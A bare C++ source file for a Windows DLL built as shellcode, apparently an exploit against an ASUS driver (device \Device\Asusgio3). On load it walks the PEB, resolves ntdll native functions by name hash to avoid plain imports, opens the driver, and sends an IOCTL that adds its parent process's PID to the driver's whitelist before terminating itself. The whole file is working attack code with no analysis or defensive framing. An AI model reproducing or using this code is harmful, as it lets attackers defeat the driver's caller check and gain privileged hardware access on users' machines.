#include <Windows.h>
#include <intrin.h>

#pragma region NT_DEFS
typedef struct _UNICODE_STRING
{
    USHORT Length;
    USHORT MaximumLength;
    PWSTR  Buffer;

} UNICODE_STRING, * PUNICODE_STRING;

typedef struct _PEB_LDR_DATA
{
    ULONG Length;
    BOOLEAN Initialized;
    HANDLE SsHandle;
    LIST_ENTRY InLoadOrderModuleList;
    LIST_ENTRY InMemoryOrderModuleList;
    LIST_ENTRY InInitializationOrderModuleList;
    PVOID EntryInProgress;
    BOOLEAN ShutdownInProgress;
    HANDLE ShutdownThreadId;
} PEB_LDR_DATA, * PPEB_LDR_DATA;

typedef struct _LDR_DATA_TABLE_ENTRY_COMPATIBLE
{
    LIST_ENTRY InLoadOrderLinks;
    LIST_ENTRY InMemoryOrderLinks;
    union
    {
        LIST_ENTRY InInitializationOrderLinks;
        LIST_ENTRY InProgressLinks;
    } DUMMYUNION0;
    PVOID DllBase;
    PVOID EntryPoint;
    ULONG SizeOfImage;
    UNICODE_STRING FullDllName;
    UNICODE_STRING BaseDllName;
    union
    {
        ULONG Flags;
        struct
        {
            ULONG PackagedBinary : 1;
            ULONG MarkedForRemoval : 1;
            ULONG ImageDll : 1;
            ULONG LoadNotificationsSent : 1;
            ULONG TelemetryEntryProcessed : 1;
            ULONG ProcessStaticImport : 1;
            ULONG InLegacyLists : 1;
            ULONG InIndexes : 1;
            ULONG ShimDll : 1;
            ULONG InExceptionTable : 1;
            ULONG ReservedFlags1 : 2;
            ULONG LoadInProgress : 1;
            ULONG LoadConfigProcessed : 1;
            ULONG EntryProcessed : 1;
            ULONG ProtectDelayLoad : 1;
            ULONG ReservedFlags3 : 2;
            ULONG DontCallForThreads : 1;
            ULONG ProcessAttachCalled : 1;
            ULONG ProcessAttachFailed : 1;
            ULONG CorDeferredValidate : 1;
            ULONG CorImage : 1;
            ULONG DontRelocate : 1;
            ULONG CorILOnly : 1;
            ULONG ChpeImage : 1;
            ULONG ReservedFlags5 : 2;
            ULONG Redirected : 1;
            ULONG ReservedFlags6 : 2;
            ULONG CompatDatabaseProcessed : 1;
        };
    } ENTRYFLAGSUNION;
    WORD ObsoleteLoadCount;
    WORD TlsIndex;
    union
    {
        LIST_ENTRY HashLinks;
        struct
        {
            PVOID SectionPointer;
            ULONG CheckSum;
        };
    } DUMMYUNION1;
    union
    {
        ULONG TimeDateStamp;
        PVOID LoadedImports;
    } DUMMYUNION2;
} LDR_DATA_TABLE_ENTRY_COMPATIBLE, * PLDR_DATA_TABLE_ENTRY_COMPATIBLE;
typedef LDR_DATA_TABLE_ENTRY_COMPATIBLE LDR_DATA_TABLE_ENTRY;
typedef LDR_DATA_TABLE_ENTRY_COMPATIBLE* PLDR_DATA_TABLE_ENTRY;
typedef LDR_DATA_TABLE_ENTRY* PCLDR_DATA_TABLE_ENTRY;


typedef struct _PEB
{
    BOOLEAN InheritedAddressSpace;
    BOOLEAN ReadImageFileExecOptions;
    BOOLEAN BeingDebugged;
    union
    {
        BOOLEAN BitField;
        struct
        {
            BOOLEAN ImageUsesLargePages : 1;
            BOOLEAN IsProtectedProcess : 1;
            BOOLEAN IsImageDynamicallyRelocated : 1;
            BOOLEAN SkipPatchingUser32Forwarders : 1;
            BOOLEAN IsPackagedProcess : 1;
            BOOLEAN IsAppContainer : 1;
            BOOLEAN IsProtectedProcessLight : 1;
            BOOLEAN IsLongPathAwareProcess : 1;
        };
    };
    HANDLE Mutant;

    PVOID ImageBaseAddress;
    PPEB_LDR_DATA Ldr;

} PEB, * PPEB;
typedef struct _IO_STATUS_BLOCK
{
    union
    {
        NTSTATUS Status;
        PVOID Pointer;
    } DUMMYUNIONNAME;

    ULONG_PTR Information;
} IO_STATUS_BLOCK, * PIO_STATUS_BLOCK;

typedef VOID(NTAPI* PIO_APC_ROUTINE)(
    _In_ PVOID ApcContext,
    _In_ PIO_STATUS_BLOCK IoStatusBlock,
    _In_ ULONG Reserved
    );

typedef struct _OBJECT_ATTRIBUTES
{
    ULONG Length;
    HANDLE RootDirectory;
    PUNICODE_STRING ObjectName;
    ULONG Attributes;
    PVOID SecurityDescriptor;
    PVOID SecurityQualityOfService;
} OBJECT_ATTRIBUTES;
typedef OBJECT_ATTRIBUTES* POBJECT_ATTRIBUTES;

typedef LONG KPRIORITY;

typedef struct _PROCESS_BASIC_INFORMATION
{
    NTSTATUS ExitStatus;
    PPEB PebBaseAddress;
    ULONG_PTR AffinityMask;
    KPRIORITY BasePriority;
    HANDLE UniqueProcessId;
    HANDLE InheritedFromUniqueProcessId;
} PROCESS_BASIC_INFORMATION, * PPROCESS_BASIC_INFORMATION;

#define InitializeObjectAttributes( p, n, a, r, s ) { \
    (p)->Length = sizeof( OBJECT_ATTRIBUTES );          \
    (p)->RootDirectory = r;                             \
    (p)->Attributes = a;                                \
    (p)->ObjectName = n;                                \
    (p)->SecurityDescriptor = s;                        \
    (p)->SecurityQualityOfService = NULL;               \
    }

#define OBJ_INHERIT                         0x00000002L
#define OBJ_PERMANENT                       0x00000010L
#define OBJ_EXCLUSIVE                       0x00000020L
#define OBJ_CASE_INSENSITIVE                0x00000040L
#define OBJ_OPENIF                          0x00000080L
#define OBJ_OPENLINK                        0x00000100L
#define OBJ_KERNEL_HANDLE                   0x00000200L
#define OBJ_FORCE_ACCESS_CHECK              0x00000400L
#define OBJ_IGNORE_IMPERSONATED_DEVICEMAP   0x00000800L
#define OBJ_DONT_REPARSE                    0x00001000L
#define OBJ_VALID_ATTRIBUTES                0x00001FF2L

#define FILE_SUPERSEDE                          0x00000000
#define FILE_OPEN                               0x00000001
#define FILE_CREATE                             0x00000002
#define FILE_OPEN_IF                            0x00000003
#define FILE_OVERWRITE                          0x00000004
#define FILE_OVERWRITE_IF                       0x00000005
#define FILE_MAXIMUM_DISPOSITION                0x00000005

#define FILE_DIRECTORY_FILE                     0x00000001
#define FILE_WRITE_THROUGH                      0x00000002
#define FILE_SEQUENTIAL_ONLY                    0x00000004
#define FILE_NO_INTERMEDIATE_BUFFERING          0x00000008

#define FILE_SYNCHRONOUS_IO_ALERT               0x00000010
#define FILE_SYNCHRONOUS_IO_NONALERT            0x00000020
#define FILE_NON_DIRECTORY_FILE                 0x00000040
#define FILE_CREATE_TREE_CONNECTION             0x00000080

#define FILE_COMPLETE_IF_OPLOCKED               0x00000100
#define FILE_NO_EA_KNOWLEDGE                    0x00000200
#define FILE_OPEN_FOR_RECOVERY                  0x00000400
#define FILE_RANDOM_ACCESS                      0x00000800

#define FILE_DELETE_ON_CLOSE                    0x00001000
#define FILE_OPEN_BY_FILE_ID                    0x00002000
#define FILE_OPEN_FOR_BACKUP_INTENT             0x00004000
#define FILE_NO_COMPRESSION                     0x00008000

#define FILE_RESERVE_OPFILTER                   0x00100000
#define FILE_OPEN_REPARSE_POINT                 0x00200000
#define FILE_OPEN_NO_RECALL                     0x00400000
#define FILE_OPEN_FOR_FREE_SPACE_QUERY          0x00800000


#define FILE_COPY_STRUCTURED_STORAGE            0x00000041
#define FILE_STRUCTURED_STORAGE                 0x00000441

#define FILE_VALID_OPTION_FLAGS                 0x00ffffff
#define FILE_VALID_PIPE_OPTION_FLAGS            0x00000032
#define FILE_VALID_MAILSLOT_OPTION_FLAGS        0x00000032
#define FILE_VALID_SET_FLAGS                    0x00000036

#define NT_SUCCESS(Status) ((NTSTATUS)(Status) >= 0)
#pragma endregion

//Function definitions
typedef NTSTATUS(NTAPI* pNtCreateFile)(
    _Out_ PHANDLE FileHandle,
    _In_ ACCESS_MASK DesiredAccess,
    _In_ POBJECT_ATTRIBUTES ObjectAttributes,
    _Out_ PIO_STATUS_BLOCK IoStatusBlock,
    _In_opt_ PLARGE_INTEGER AllocationSize,
    _In_ ULONG FileAttributes,
    _In_ ULONG ShareAccess,
    _In_ ULONG CreateDisposition,
    _In_ ULONG CreateOptions,
    _In_reads_bytes_opt_(EaLength) PVOID EaBuffer,
    _In_ ULONG EaLength);

typedef NTSTATUS(NTAPI* pNtDeviceIoControlFile)(
    _In_ HANDLE FileHandle,
    _In_opt_ HANDLE Event,
    _In_opt_ PIO_APC_ROUTINE ApcRoutine,
    _In_opt_ PVOID ApcContext,
    _Out_ PIO_STATUS_BLOCK IoStatusBlock,
    _In_ ULONG IoControlCode,
    _In_reads_bytes_opt_(InputBufferLength) PVOID InputBuffer,
    _In_ ULONG InputBufferLength,
    _Out_writes_bytes_opt_(OutputBufferLength) PVOID OutputBuffer,
    _In_ ULONG OutputBufferLength);

typedef VOID(NTAPI* pRtlInitUnicodeString)(
    _Out_ PUNICODE_STRING DestinationString,
    _In_opt_ PCWSTR SourceString);

typedef NTSTATUS(NTAPI* pNtQueryInformationProcess)(
    _In_ HANDLE ProcessHandle,
    _In_ PROCESS_INFORMATION_CLASS ProcessInformationClass,
    _Out_writes_bytes_(ProcessInformationLength) PVOID ProcessInformation,
    _In_ ULONG ProcessInformationLength,
    _Out_opt_ PULONG ReturnLength);

typedef VOID(NTAPI* pNtTerminateProcess)(
    _In_opt_ HANDLE ProcessHandle,
    _In_ NTSTATUS  ExitStatus);

//Hashes
#define Hash_NtCreateFile		        0x71e2bc4a
#define Hash_NtDeviceIoControlFile      0xc24c2e8e
#define Hash_RtlInitUnicodeString       0xcd51673e
#define Hash_NtQueryInformationProcess  0x47ccd80a
#define Hash_NtTerminateProcess         0xD76D6BD6

//Functions for shellcode

__forceinline unsigned long long comphash(char* c)
{
    unsigned long hash = 0;

    while (*c != 0)
    {
        hash ^= *c++;
        hash = _rotl(hash, 3) + 1;
    }

    return hash;
}

__forceinline void* get_export(void* image, DWORD fn_hash)
{
    PIMAGE_DOS_HEADER DosHeader = (PIMAGE_DOS_HEADER)image;
    if (DosHeader->e_magic != IMAGE_DOS_SIGNATURE)
        return NULL;

    PIMAGE_NT_HEADERS NtHeader = (PIMAGE_NT_HEADERS)((ULONG)DosHeader + DosHeader->e_lfanew);
    if (NtHeader->Signature != IMAGE_NT_SIGNATURE)
        return NULL;

    PIMAGE_EXPORT_DIRECTORY ExportDir = (PIMAGE_EXPORT_DIRECTORY)((ULONG)DosHeader + NtHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);

    PULONG Names = (PULONG)((ULONGLONG)DosHeader + ExportDir->AddressOfNames);
    PULONG Functions = (PULONG)((ULONGLONG)DosHeader + ExportDir->AddressOfFunctions);
    PWORD Ordinals = (PWORD)((ULONGLONG)DosHeader + ExportDir->AddressOfNameOrdinals);

    for (SIZE_T i = 0; i < ExportDir->NumberOfNames; ++i)
    {
        char* name = (char*)((ULONGLONG)DosHeader + Names[i]);
        void* func = (void*)((ULONGLONG)DosHeader + Functions[Ordinals[i]]);

        
        if (comphash(name) == fn_hash)
            return func;
    }

    return NULL;
}

int _entry(void)
{
    pRtlInitUnicodeString RtlInitUnicodeString;
    pNtCreateFile NtCreateFile;
    pNtDeviceIoControlFile NtDeviceIoControlFile;
    pNtQueryInformationProcess NtQueryInformationProcess;
    pNtTerminateProcess NtTerminateProcess;

    OBJECT_ATTRIBUTES obj_attr;
    IO_STATUS_BLOCK io_status;

    PPEB peb = (PPEB)__readfsdword(0x30);

    PLDR_DATA_TABLE_ENTRY head = (PLDR_DATA_TABLE_ENTRY)peb->Ldr->InLoadOrderModuleList.Flink;
    PVOID ntdll_base = ((PLDR_DATA_TABLE_ENTRY)head->InLoadOrderLinks.Flink)->DllBase;

    RtlInitUnicodeString = (pRtlInitUnicodeString)get_export(ntdll_base, Hash_RtlInitUnicodeString);
    NtCreateFile = (pNtCreateFile)get_export(ntdll_base, Hash_NtCreateFile);
    NtDeviceIoControlFile = (pNtDeviceIoControlFile)get_export(ntdll_base, Hash_NtDeviceIoControlFile);
    NtQueryInformationProcess = (pNtQueryInformationProcess)get_export(ntdll_base, Hash_NtQueryInformationProcess);
    NtTerminateProcess = (pNtTerminateProcess)get_export(ntdll_base, Hash_NtTerminateProcess);

    if (!RtlInitUnicodeString || !NtCreateFile || !NtDeviceIoControlFile || !NtQueryInformationProcess || !NtTerminateProcess)
        return 0;

    //array done like this is setup with code, I hope
    wchar_t device_charmap[] = { L'\\', L'D', L'e', L'v', L'i', L'c', L'e', L'\\', L'A', L's', L'u', L's', L'g', L'i', L'o', L'3', 0 };

    UNICODE_STRING device_name;
    RtlInitUnicodeString(&device_name, device_charmap);
    HANDLE dev_handle = INVALID_HANDLE_VALUE;
    InitializeObjectAttributes(&obj_attr, &device_name, OBJ_CASE_INSENSITIVE, NULL, NULL);

    NTSTATUS status = NtCreateFile(&dev_handle, GENERIC_WRITE | GENERIC_READ, &obj_attr, &io_status, NULL, 0, 0, FILE_OPEN, 0, NULL, 0);
    if (!NT_SUCCESS(status))
        return 0;

    PROCESS_BASIC_INFORMATION pbi = { 0 };

    ULONG RetLength = 0;
    status = NtQueryInformationProcess((HANDLE)-1, (PROCESS_INFORMATION_CLASS)0, &pbi, sizeof(pbi), &RetLength);
    if (!NT_SUCCESS(status))
        return 0;

    ULONG inherit_pid = (ULONG)pbi.InheritedFromUniqueProcessId; ULONG out = 0;

    constexpr ULONG IOCTL_ADD_WHITELIST_PID = 0xA040A490;
    NtDeviceIoControlFile(dev_handle, NULL, NULL, NULL, &io_status, IOCTL_ADD_WHITELIST_PID, &inherit_pid, sizeof(inherit_pid), &out, sizeof(out));

    NtTerminateProcess(reinterpret_cast<HANDLE>(-1), 0);
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    switch (ul_reason_for_call) {
    case DLL_PROCESS_ATTACH:
        // The DLL is being loaded into the virtual address space of the current process
        // Perform initialization tasks here
        _entry();
        break;
    default:
        break;
    }
}